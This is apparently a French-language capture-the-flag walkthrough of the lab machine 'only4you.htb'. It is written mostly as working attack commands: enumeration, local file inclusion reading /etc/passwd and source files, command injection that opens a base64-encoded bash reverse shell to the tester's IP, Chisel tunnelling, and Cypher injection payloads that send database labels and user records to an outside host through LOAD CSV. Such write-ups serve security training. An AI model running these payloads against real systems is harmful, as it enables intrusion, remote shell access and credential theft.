# Enum
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -u http://only4you.htb/
Found: 
```
beta.only4you.htb
```
└─# gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://beta.only4you.htb/
```
/download             (Status: 405) [Size: 683]
/list                 (Status: 200) [Size: 5934]
/resize               (Status: 200) [Size: 2984]
/source               (Status: 200) [Size: 12127
```

# Exploit
Téléchargement de app.py trought /source
On découvre dans le code source qu'on peut télécharger des fichier à partir de /download avec la methode POST

└─# #Exploit_LFI 
```
curl beta.only4you.htb/download -X POST -d "image=/etc/passwd"
```
*john:x:1000:1000:john:/home/john:/bin/bash*
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
## Burp Intruder
image = `$ $` 
https://github.com/Zelofane22/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt
## result statut 200
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
##
```
curl beta.only4you.htb/download -X POST -d "image=/var/www/only4you.htb/app.py"
```
```
curl beta.only4you.htb/download -X POST -d "image=/var/www/only4you.htb/form.py"
```

On a une execution de code sur la ligne 25
	result = run([f"dig txt {domain}"], shell=True, stdout=PIPE) *FAILLE TROUVER*

## Je tente d'executer un curl sur la sible vers ma machine
└─# curl only4you.htb -X POST -d "name=dine&email=dine@gmail;curl 10.10.17.161&subject=dien&message=dine"
Ma machine à reçu la requête

## 
└─#
```
echo -n 'bash -i >& /dev/tcp/10.10.17.161/1234 0>&1' | base64 -w 0
```
	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx 
└─# 
```
curl only4you.htb -X POST -d "name=dine&email=dine@gmail.com;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash&subject=dien&message=dine"
```
# foothold
$ ss -lntp
Il y a des port cachés qui ne fonctionnent qu'en local sur la sible

## Partage des ports sur ma machine
On utilise *Chisel*
### creation du serveur proxi sur ma machine
└─# 
```
./chisel server -p 8000 --reverse
```

www-data@only4you:/tmp$
```
./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
```

## accès aux port 3000 et 8001

## Cypher injection sur le site hébergé sur le port 8001


[https://github.com/sectroyer/cyphermap](https://github.com/sectroyer/cyphermap "https://github.com/sectroyer/cyphermap")
```
python3 cyphermap.py -u "http://127.0.0.1:8001/search" -d "search=a*" -c "session=2b1b4d22-6660-46ee-9b41-f97651c21144;" -L   
```

--> table user
```
./cyphermap.py -u "http://127.0.0.1:8001/search" -d "search=a*" -c "session=2b1b4d22-6660-46ee-9b41-f97651c21144;"  -s Sarah -P user -K username,pas
```

```
a' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.194/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // => version a'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.194/?l='+label as l RETURN 0 as _0 <= ne marche pas mais celle d'avant ci, donc go modifier celle d'avant pour adapter a' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.194/?l='+label as l RETURN 0 as _0 // => enum les labels/db maintenant je veux le contenue de "user" : a' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.194/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.5:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

## recuperation de hashes

## cracker hash
https://crackstation.net/